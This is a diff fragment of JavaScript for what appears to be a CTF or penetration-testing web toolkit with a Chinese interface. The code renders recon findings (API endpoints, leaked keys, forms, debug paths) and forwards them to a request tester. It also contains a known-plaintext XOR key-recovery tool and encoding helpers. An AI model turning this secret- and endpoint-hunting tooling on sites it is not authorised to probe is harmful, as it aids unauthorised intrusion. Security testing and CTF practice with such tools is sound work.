+  $('httpUrl').value = fullUrl;
+  $('httpMethod').value = method || 'GET';
+  $('httpBody').value = '';
+  // 滚动到 HTTP 部分
+  var httpCard = document.querySelector('.card:nth-child(6)');
+  if (httpCard) httpCard.scrollIntoView({behavior: 'smooth'});
+  alert('已填入 HTTP 请求模块，点击「发送请求」验证');
+}
+
+function renderJsReconResults(){
+  var out = $('jsReconResults');
+  var statsBox = $('jsReconStats');
+  
+  var epCount = jsReconFindings.endpoints.length;
+  var secCount = jsReconFindings.secrets.length;
+  var formCount = jsReconFindings.forms.length;
+  var debugCount = jsReconFindings.debug.length;
+  
+  $('jsStatEndpoints').textContent = epCount;
+  $('jsStatSecrets').textContent = secCount;
+  $('jsStatForms').textContent = formCount;
+  $('jsStatDebug').textContent = debugCount;
+  statsBox.style.display = 'flex';
+  
+  var html = '';
+  
+  // Critical secrets
+  var critical = jsReconFindings.secrets.filter(function(s){ return s.severity === 'critical'; });
+  if (critical.length > 0) {
+    html += '<h4 style="color:#dc2626;margin:12px 0 6px;">🚨 高危发现（密钥/凭据）</h4>';
+    critical.forEach(function(f){
+      html += renderFinding(f, 'critical');
+    });
+  }
+  
+  // Warning secrets + debug
+  var warnings = jsReconFindings.secrets.filter(function(s){ return s.severity === 'warning'; });
+  if (warnings.length > 0 || debugCount > 0) {
+    html += '<h4 style="color:#f59e0b;margin:12px 0 6px;">⚠️ 中危发现（敏感信息/调试接口）</h4>';
+    warnings.forEach(function(f){ html += renderFinding(f, 'warning'); });
+    jsReconFindings.debug.forEach(function(d){ html += renderDebugFinding(d); });
+  }
+  
+  // Endpoints with collapsible static/API split
+  if (epCount > 0) {
+    var apiEndpoints = jsReconFindings.endpoints.filter(function(e){
+      var v = e.value.toLowerCase();
+      return v.includes('api') || v.includes('/v') || v.includes('graphql') || v.includes('auth') || v.includes('login') || v.includes('admin') || v.includes('debug') || v.includes('swagger') || v.includes('webhook') || v.includes('callback');
+    });
+    var staticEndpoints = jsReconFindings.endpoints.filter(function(e){
+      return apiEndpoints.indexOf(e) === -1;
+    });
+    
+    if (apiEndpoints.length > 0) {
+      html += '<h4 style="color:#2563eb;margin:12px 0 6px;">🔗 API 端点 (' + apiEndpoints.length + ')</h4>';
+      apiEndpoints.forEach(function(f){ html += renderEndpointFinding(f); });
+    }
+    
+    if (staticEndpoints.length > 0) {
+      html += '<details style="margin:8px 0;border:1px solid #e5e7eb;border-radius:8px;"><summary style="padding:8px;cursor:pointer;font-weight:600;color:#6b7280;">📦 静态资源 (' + staticEndpoints.length + ') <span style="font-size:11px;float:right;color:#999;">点击展开</span></summary><div style="padding:8px 16px;">';
+      staticEndpoints.forEach(function(f){ html += renderEndpointFinding(f, 'static'); });
+      html += '</div></details>';
+    }
+  }
+  
+  // Forms
+  if (formCount > 0) {
+    html += '<h4 style="color:#2563eb;margin:12px 0 6px;">📝 表单发现</h4>';
+    jsReconFindings.forms.forEach(function(f){ html += renderFormFinding(f); });
+  }
+  
+  if (html === '') {
+    html = '<div class="empty">未发现可疑内容</div>';
+  }
+  
+  out.innerHTML = html;
+  addHist('JSRecon扫描', '端点:' + epCount + ' 密钥:' + secCount + ' 表单:' + formCount + ' 调试:' + debugCount);
+}
+
+function renderFinding(f, severity){
+  var tagClass = severity === 'critical' ? 'tag critical' : severity === 'warning' ? 'tag warning' : 'tag info';
+  var divClass = 'jsrecon-finding ' + severity;
+  var label = severity === 'critical' ? '🚨 密钥' : severity === 'warning' ? '⚠️ 敏感' : 'ℹ️ 端点';
+  
+  return '<div class="' + divClass + '">' +
+    '<span class="tag ' + tagClass + '">' + label + '</span>' +
+    '<span class="key">' + (f.type || f.path || '未知') + ':</span>' +
+    '<div class="val">' + escapeHtml(f.value || f.path || '') + '</div>' +
+    (f.source ? '<div style="font-size:11px;color:#999;margin-top:4px;">来源：' + f.source + '</div>' : '') +
+    '</div>';
+}
+
+function renderEndpointFinding(f, isStatic){
+  var cls = isStatic ? 'jsrecon-finding info static-ep' : 'jsrecon-finding info api-ep';
+  var label = isStatic ? '📦 静态' : '🔗 API';
+  var tagCls = isStatic ? 'tag info' : 'tag warning';
+  
+  var fullUrl = f.fullUrl || f.value;
+  
+  return '<div class="' + cls + '">' +
+    '<span class="tag ' + tagCls + '">' + label + '</span>' +
+    '<div style="display:flex;flex-direction:column;gap:4px;">' +
+    '<div class="val" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">' +
+    '<span style="font-family:monospace;font-size:12px;color:#374151;flex:1;">' + escapeHtml(fullUrl) + '</span>' +
+    '<button class="btn small" onclick="copyText(\'' + escapeJs(fullUrl) + '\')">复制路径</button>' +
+    '<button class="btn small" onclick="sendToHttpTest(\'' + escapeJs(fullUrl) + '\', \'GET\')">发送测试</button>' +
+    '</div>' +
+    '<div style="font-size:11px;color:#999;">来源：' + (f.source || '未知') + '</div>' +
+    '</div>' +
+    '</div>';
+}
+
+function copyText(text){
+  navigator.clipboard.writeText(text).then(function(){
+    // 恢复按钮文字
+  });
+}
+
+function escapeJs(s){
+  return s.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n').replace(/\r/g, '\\r');
+}
+
+function renderDebugFinding(d){
+  var fullUrl = d.path;
+  return '<div class="jsrecon-finding warning">' +
+    '<span class="tag warning">⚠️ 调试</span>' +
+    '<div style="display:flex;flex-direction:column;gap:4px;">' +
+    '<div class="val" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">' +
+    '<span style="font-family:monospace;font-size:12px;color:#374151;flex:1;">' + escapeHtml(fullUrl) + '</span>' +
+    '<button class="btn small" onclick="copyText(\'' + escapeJs(fullUrl) + '\')">复制路径</button>' +
+    '<button class="btn small" onclick="sendToHttpTest(\'' + escapeJs(fullUrl) + '\', \'GET\')">发送测试</button>' +
+    '</div>' +
+    '</div>' +
+    '</div>';
+}
+
+function renderFormFinding(f){
+  var inputsHtml = f.inputs.map(function(i){
+    return i.name + '(' + i.type + ')';
+  }).join(', ');
+  var fullAction = f.action;
+  
+  // 构造表单数据字符串，用于填充到 HTTP Body
+  var formDataStr = f.inputs.map(function(i){ return i.name + '='; }).join('&');
+  
+  return '<div class="jsrecon-finding info">' +
+    '<span class="tag info">📝 表单</span>' +
+    '<div style="display:flex;flex-direction:column;gap:4px;">' +
+    '<div class="val" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">' +
+    '<span style="font-family:monospace;font-size:12px;color:#374151;flex:1;">' + escapeHtml(fullAction) + ' [' + f.method + ']</span>' +
+    '<button class="btn small" onclick="copyText(\'' + escapeJs(fullAction) + '\')">复制路径</button>' +
+    '<button class="btn small" onclick="sendToHttpTest(\'' + escapeJs(fullAction) + '\', \'' + f.method + '\')">发送测试</button>' +
+    '<button class="btn small" onclick="fillFormToHttp(\'' + escapeJs(formDataStr) + '\', \'' + escapeJs(f.method) + '\')">填充 Body</button>' +
+    '</div>' +
+    '<div style="font-size:11px;color:#999;">字段：' + escapeHtml(inputsHtml) + '</div>' +
+    '</div>' +
+    '</div>';
+}
+
+// 将表单字段填充到 HTTP 请求 Body
+function fillFormToHttp(formDataStr, method){
+  $('httpUrl').value = $('jsReconUrl').value || $('httpUrl').value;
+  $('httpMethod').value = method || 'GET';
+  $('httpBody').value = formDataStr;
+  // 如果是 POST，自动添加 Content-Type
+  if (method === 'POST') {
+    var headers = $('httpHeaders').value;
+    if (!headers.includes('Content-Type')) {
+      $('httpHeaders').value = (headers ? headers + '\n' : '') + 'Content-Type: application/x-www-form-urlencoded';
+    }
+  }
+  var httpCard = document.querySelector('.card:nth-child(5)');
+  if (httpCard) httpCard.scrollIntoView({behavior: 'smooth'});
+  alert('表单字段已填充到 HTTP Body，可修改后点击「发送请求」');
+}
+
+function jsReconClear(){
+  jsReconFindings = {endpoints: [], secrets: [], forms: [], debug: []};
+  $('jsReconResults').innerHTML = '';
+  $('jsReconStats').style.display = 'none';
+  $('jsReconUrl').value = '';
+}
+
+function copyJsReconBookmarklet(){
+  var code = '(function(){var s=document.createElement(\'script\');s.src=\'file:///F:/ctf%20aaa/jsrecon-content.js\';document.head.appendChild(s);})();';
+  navigator.clipboard.writeText(code).then(function(){
+    alert('Bookmarklet 代码已复制到剪贴板');
+  });
+}
+
+// ===== 已知明文异或分析 =====
+function hexToBytes(hex){
+  var bytes = [];
+  for (var i = 0; i < hex.length; i += 2) {
+    bytes.push(parseInt(hex.substr(i, 2), 16));
+  }
+  return bytes;
+}
+
+function analyzeKnownXOR(){
+  var cipherHex = $('xorKnownCipher').value.replace(/\s/g, '');
+  var plainText = $('xorKnownPlain').value;
+  var out = $('xorKnownResult');
+  
+  if (!cipherHex || !plainText) {
+    out.innerHTML = '<div style="color:#dc2626;">请输入密文和明文</div>';
+    return;
+  }
+  
+  if (cipherHex.length % 2 !== 0) {
+    out.innerHTML = '<div style="color:#dc2626;">密文 hex 长度必须是偶数</div>';
+    return;
+  }
+  
+  var cipher = hexToBytes(cipherHex);
+  var plain = [];
+  for (var i = 0; i < plainText.length; i++) {
+    plain.push(plainText.charCodeAt(i));
+  }
+  
+  var len = Math.min(cipher.length, plain.length);
+  if (len === 0) {
+    out.innerHTML = '<div style="color:#dc2626;">无可比较字节</div>';
+    return;
+  }
+  
+  // 计算密钥流
+  var keyStream = [];
+  for (var i = 0; i < len; i++) {
+    keyStream.push(cipher[i] ^ plain[i]);
+  }
+  
+  var html = '';
+  html += '<h4 style="margin:0 0 8px;">📊 分析结果</h4>';
+  html += '<div style="background:#f8fafc;border:1px solid #e5e7eb;border-radius:8px;padding:12px;">';
+  html += '<div><strong>密文长度：</strong>' + cipher.length + ' 字节</div>';
+  html += '<div><strong>明文长度：</strong>' + plain.length + ' 字节</div>';
+  html += '<div><strong>可比较长度：</strong>' + len + ' 字节</div>';
+  
+  if (cipher.length !== plain.length) {
+    html += '<div style="color:#dc2626;margin-top:6px;">⚠️ 长度不匹配，无法直接做完整异或解密</div>';
+  }
+  
+  // 检查是否单字节 XOR
+  var isSingleByte = true;
+  var firstKey = keyStream[0];
+  for (var i = 1; i < keyStream.length; i++) {
+    if (keyStream[i] !== firstKey) {
+      isSingleByte = false;
+      break;
+    }
+  }
+  
+  html += '<div><strong>异或密钥流（前 ' + len + ' 字节）：</strong></div>';
+  html += '<div style="font-family:monospace;color:#2563eb;margin:4px 0;">' + keyStream.map(function(b){ return b.toString(16).padStart(2,'0'); }).join(' ') + '</div>';
+  
+  if (isSingleByte) {
+    html += '<div style="color:#059669;margin-top:6px;">✅ 检测到单字节 XOR，密钥：0x' + firstKey.toString(16).padStart(2,'0') + ' (' + firstKey + ')</div>';
+    
+    // 尝试用该密钥解密全部密文
+    var decrypted = '';
+    for (var i = 0; i < cipher.length; i++) {
+      var ch = cipher[i] ^ firstKey;
+      decrypted += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : '.';
+    }
+    html += '<div style="margin-top:6px;"><strong>单字节 XOR 解密结果：</strong></div>';
+    html += '<div style="font-family:monospace;background:#f0fdf4;border:1px solid #86efac;border-radius:6px;padding:8px;">' + escapeHtml(decrypted) + '</div>';
+  } else {
+    html += '<div style="color:#f59e0b;margin-top:6px;">❌ 不是单字节 XOR（密钥流不固定）</div>';
+    
+    // 尝试循环密钥长度 2-16
+    html += '<div style="margin-top:8px;"><strong>循环密钥长度推测（2-16）：</strong></div>';
+    var found = false;
+    for (var kl = 2; kl <= 16; kl++) {
+      var ok = true;
+      for (var i = kl; i < len; i++) {
+        if (keyStream[i] !== keyStream[i % kl]) {
+          ok = false;
+          break;
+        }
+      }
+      if (ok) {
+        found = true;
+        var keyBytes = keyStream.slice(0, kl);
+        html += '<div style="color:#059669;">✅ 长度 ' + kl + '，密钥：' + keyBytes.map(function(b){ return b.toString(16).padStart(2,'0'); }).join('') + '</div>';
+        
+        // 用该循环密钥解密全部
+        var decrypted = '';
+        for (var i = 0; i < cipher.length; i++) {
+          var ch = cipher[i] ^ keyBytes[i % kl];
+          decrypted += (ch >= 32 && ch < 127) ? String.fromCharCode(ch) : '.';
+        }
+        html += '<div style="font-family:monospace;background:#f0fdf4;border:1px solid #86efac;border-radius:6px;padding:8px;margin-top:4px;">' + escapeHtml(decrypted) + '</div>';
+        break;
+      }
+    }
+    if (!found) {
+      html += '<div style="color:#9ca3af;">未在 2-16 长度内找到循环密钥</div>';
+    }
+  }
+  
+  html += '</div>';
+  out.innerHTML = html;
+  addHist('已知明文异或分析', '密文:' + cipher.length + 'B 明文:' + plain.length + 'B');
+}
+
+function clearKnownXOR(){
+  $('xorKnownCipher').value = '';
+  $('xorKnownPlain').value = '';
+  $('xorKnownResult').innerHTML = '';
+}
+
+// ===== 自动脚本模块 =====
+function clearAuto(){
+  $('autoInput').value = '';
+  $('autoOutput').value = '';
+  $('autoResult').style.display = 'none';
+  $('autoBatchResult').innerHTML = '';
+}
+
+function runAutoChain(){
+  var input = $('autoInput').value;
+  if (!input) return alert('请输入内容');
+  
+  var c1 = $('autoChain1').value;
+  var c2 = $('autoChain2').value;
+  var c3 = $('autoChain3').value;
+  
+  var result = input;
+  var steps = [];
+  
+  if (c1 !== 'none') { result = applyTransform(result, c1); steps.push(c1); }
+  if (c2 !== 'none') { result = applyTransform(result, c2); steps.push(c2); }
+  if (c3 !== 'none') { result = applyTransform(result, c3); steps.push(c3); }
+  
+  $('autoOutput').value = result;
+  $('autoResult').style.display = 'block';
+  $('autoResult').innerHTML = '<strong>步骤：</strong>' + steps.join(' → ') + '<br><strong>结果：</strong><br>' + escapeHtml(result);
+  addHist('自动脚本-编码链', steps.join(' → ') + '，长度 ' + result.length);
+}
+
+function applyTransform(str, op){
+  switch(op){
+    case 'base64enc': return b64Encode(str);
+    case 'base64dec': return b64Decode(str);
+    case 'urlenc': return encodeURIComponent(str);
+    case 'urldec': return decodeURIComponent(str);
+    case 'hexenc': return strToHex(str);
+    case 'hexdec': return hexToStr(str);
+    case 'rot13': return rot13(str);
+    case 'reverse': return str.split('').reverse().join('');
+    case 'upper': return str.toUpperCase();
+    case 'lower': return str.toLowerCase();
+    default: return str;
+  }
+}
+
+function runAutoJs(){
+  var input = $('autoInput').value;
+  var code = $('autoJsCode').value;
+  if (!code) return alert('请输入 JS 代码');
+  
+  try {
+    var fn = new Function('input', 'return ' + code);
+    var result = fn(input);
+    $('autoOutput').value = result;
+    $('autoResult').style.display = 'block';
+    $('autoResult').innerHTML = '<strong>JS 执行结果：</strong><br>' + escapeHtml(String(result));
+    addHist('自动脚本-JS', '自定义 JS 处理，长度 ' + String(result).length);
+  } catch(e) {
+    alert('JS 执行出错：' + e.message);
+  }
+}
+
+function runAutoBatch(){
+  var input = $('autoInput').value;
+  var op = $('autoBatchOp').value;
+  var lines = input.split('\n');
+  var results = [];
+  
+  for (var i = 0; i < lines.length; i++) {
+    var line = lines[i];
+    if (line.trim() === '') {
+      results.push('');
+      continue;
+    }
+    try {
+      var r = applyTransform(line, op);
+      results.push(r);
+    } catch(e) {
+      results.push('[错误: ' + e.message + ']');
+    }
+  }
+  
+  var resultText = results.join('\n');
+  $('autoBatchResult').innerHTML = '<strong>处理完成：</strong> ' + results.length + ' 行';
+  addHist('自动脚本-批量', op + '，' + results.length + ' 行');
+  
+  // 显示结果在输出区
+  $('autoOutput').value = resultText;
+  $('autoResult').style.display = 'block';
+  $('autoResult').innerHTML = '<strong>批量处理结果（' + op + '）：</strong><br>' + escapeHtml(resultText.substring(0, 500)) + (resultText.length > 500 ? '...' : '');
+}
+
+// ===== 基础编解码函数 =====
+function b64Encode(str){
+  try { return btoa(unescape(encodeURIComponent(str))); } catch(e){ return str; }
+}
+function b64Decode(str){
+  try { return decodeURIComponent(escape(atob(str))); } catch(e){ return str; }
+}
+function strToHex(str){
+  var hex = '';
+  for (var i = 0; i < str.length; i++) {
+    hex += str.charCodeAt(i).toString(16).padStart(2, '0');
+  }
+  return hex;
+}
+function hexToStr(hex){
+  var str = '';
+  for (var i = 0; i < hex.length; i += 2) {
+    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+  }
+  return str;
+}
+function rot13(str){
+  return str.replace(/[a-zA-Z]/g, function(c){
+    return String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
+  });
+}
+
+// ===== Initialize =====
+document.addEventListener('DOMContentLoaded', function(){
+  initPayloads();
+});
+</script>
+</body>
+</html>
